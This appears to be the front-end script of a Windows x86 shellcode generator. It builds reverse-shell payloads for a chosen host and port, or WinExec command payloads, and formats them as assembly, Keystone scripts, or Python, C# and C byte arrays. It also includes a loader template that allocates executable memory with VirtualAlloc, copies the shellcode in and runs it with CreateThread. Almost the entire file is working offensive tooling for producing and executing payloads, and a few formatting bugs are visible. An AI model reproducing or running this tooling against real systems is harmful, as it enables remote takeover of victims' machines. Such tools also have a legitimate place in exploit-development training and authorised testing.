import argparse
import re

from generate import generate


def main(args):
    filename = ""
    test = args.test
    if args.revshell:
        if args.cmd:
            print(
                "This tool cannot peform both revshell and cmd at same time. You must choose one."
            )
            exit()
        if args.lhost:
            if args.lport:
                lhost = args.lhost
                lport = args.lport
            else:
                print("You must specify a port")
                exit()
        else:
            print("You must specify a lhost!")
            exit()
        if args.verbose:
            print(
                f"Entering revshell mode. Revshell will be generated for {lhost}:{lport}"
            )
        mode = "revshell"
        arguments = (lhost, lport)

    elif args.cmd:
        if args.revshell:
            print(
                "This tool cannot peform both revshell and cmd at same time. You must choose one."
            )
            exit()
        if args.verbose:
            print(
                f"Entering cmd mode. Your command is {args.cmd}. A payload using the WinExec api call will be made."
            )
        mode = "cmd"
        arguments = args.cmd
    else:
        print("You must choose revshell of cmd in order to get output")
        exit()

    if args.output:
        if args.format == 0:
            format = "python"
            if args.verbose:
                print("No output format specified, defaulting to python format")
        elif args.format in ("assembly", "keystone", "python", "csharp", "c", "raw"):
            format = args.format
        else:
            print("You have chosen an invalid format")
            exit()
        filename = args.output
        if args.verbose:
            print(f"You have chosen to output to {filename} in the format {format}")

    if args.test:
        if args.output:
            filename = args.output
        else:
            filename = "shellcode.txt"
        if args.format == 0:
            format = "keystone"
        elif args.format in ("python", "csharp", "c"):
            format = args.format
        else:
            print(
                "You have chosen an invalid format, test files can only be created for keystone, python, csharp and c"
            )
            exit()
        if args.verbose:
            print(
                f"You have chosen to create a test file called {filename} using format {format}"
            )

    assembly, encoding = generate(mode, arguments)

    if filename != "":
        writeOutput(filename, format, test, assembly, encoding)


def pythonFormat(encoding):
    shellcode = 'shellcode = bytearry("'
    for e in encoding:
        shellcode += "\\x{0:02x}".format(int(e)).rstrip("\n")
    shellcode += ')"'
    return shellcode


def csharpFormat(encoding):
    shellcode = "byte[] buf = {\n"
    count = 0
    length = len(encoding)
    for e in encoding:
        shellcode += "0x{0:02x}".format(int(e)).rstrip("\n")
        if count < length - 1:
            shellcode += ", "
            count += 1
            if count % 16 == 0:
                shellcode += "\n"
        else:
            shellcode += "\n}"
    return shellcode


def cFormat(encoding):
    shellcode = "unsigned char buf [] = "
    for e in encoding:
        shellcode += "\\x{0:02x}".format(int(e)).rstrip("\n")
    shellcode += '";'
    return shellcode


def writeOutput(filename, format, test, assembly, encoding):

    match format:
        case "assembly":
            pretty = "\n".join(
                line.lstrip()
                for line in assembly.replace(":", ":\n")
                .replace(";", ";\n")
                .splitlines()
            )
            output = re.sub(r"(\w+):", r"\n\1:", pretty)
            #            output = "\n".join(
            #    assembly.replace(":", ":\n").replace(";", ";\n").splitlines().lstrip()
            # )
        case "python":
            if test == 0:
                output = pythonFormat(encoding)
            else:
                output = "import struct, ctypes\n\n"
                output += pythonFormat(encoding)
                output += PYSCRUNNER
        case "csharp":
            if test == 0:
                output = csharpFormat(encoding)
            else:
                print("This feature is not yet built")
        case "keystone":
            newline = ';"\n"'
            newline2 = ':"\n"'
            output = "import struct, ctypes\n"
            output += "from keystone import *\n"
            output += "ASSEMBLY = (\n"
            output += f"\"{assembly.replace(';', newline).replace(': ', newline2)}"
            output = output[:-1]
            output += "\n)\n"
            output += KSTEMPLATE
            output += PYSCRUNNER
        case "c":
            if test == 0:
                output = cFormat(encoding)
            else:
                print("This feature is not yet built")

        case _:
            print("You have chosen an invalid format")
            exit()

    with open(filename, "w") as fhand:
        fhand.write(output)


KSTEMPLATE = (
    "# Build the shell code\n"
    "ks = Ks(KS_ARCH_X86, KS_MODE_32)\n"
    "encoding, count = ks.asm(ASSEMBLY)\n"
    'print(f"Encoded {count} instructions")\n'
    'sh = b""\n'
    'shellcode_printable = ""\n'
    "for e in encoding:\n"
    '\tsh += struct.pack("B", e)\n'
    '\tshellcode_printable += "\\\\x{0:02x}".format(int(e)).rstrip("\\n")\n'
    "shellcode = bytearray(sh)\n"
    'print(f"size = {len(shellcode)}")\n'
    'print("shellcode = b\\"" + shellcode_printable + "\\"")\n'
)
PYSCRUNNER = (
    "\n\n"
    "ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),\n"
    "\t\t\t\t\t\tctypes.c_int(len(shellcode)),\n"
    "\t\t\t\t\t\tctypes.c_int(0x3000),\n"
    "\t\t\t\t\t\tctypes.c_int(0x40))\n"
    "buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)\n"
    "ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),\n"
    "\t\t\t\t\tbuf,\n"
    "\t\t\t\t\tctypes.c_int(len(shellcode)))\n"
    'print(f"Shellcode located at address {hex(ptr)}")\n'
    'input("...PRESS ENTER TO RUN THE SHELLCODE...")\n'
    "ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),\n"
    "\t\t\t\t\tctypes.c_int(0),\n"
    "\t\t\t\t\tctypes.c_int(ptr),\n"
    "\t\t\t\t\tctypes.c_int(0),\n"
    "\t\t\t\t\tctypes.c_int(0),\n"
    "\t\t\t\t\tctypes.pointer(ctypes.c_int(0)))\n"
    "ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),\n"
    "\t\t\t\t\tctypes.c_int(-1))\n"
)

if __name__ == "__main__":
    formathelp = """
    assembly            Output the assembly
    keystone            Output assemly-generator file that uses keystone engine to produce shellcode and run it
    python              Output as python-formatted shellcode. If -t is set, then will generate a .py file to test 
    csharp              Output as csharp-formatted shellcode. If -t is set, then will generate a .cs file to compile and test 
    c                   Output as c-formatted shellcode. If -t is set, then will generate a .c file to compile and test.
    """

    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-v", "--verbose", help="Display additional information", action="store_true"
    )
    parser.add_argument(
        "-r",
        "--revshell",
        help="Create a revshell, must provide an ip address and a port",
        action="store_true",
    )
    parser.add_argument("-l", "--lhost", help="Localhost used for reverse shell")
    parser.add_argument("-p", "--lport", help="Port used for reverse shell")
    parser.add_argument(
        "-c", "--cmd", help="Use the WinExec API call to execute a command"
    )
    parser.add_argument(
        "-o",
        "--output",
        help="Write the shellcode to a file. Format can be specified with -f. The default format is python",
        default=0,
    )
    parser.add_argument("-f", "--format", help=formathelp, default=0)
    parser.add_argument(
        "-t",
        "--test",
        help="Output a file that can be used to test the payload in the specified format. If not filename is given, the default is test.txt and the format is keystone.",
        action="store_true",
    )

    args = parser.parse_args()
    main(args)
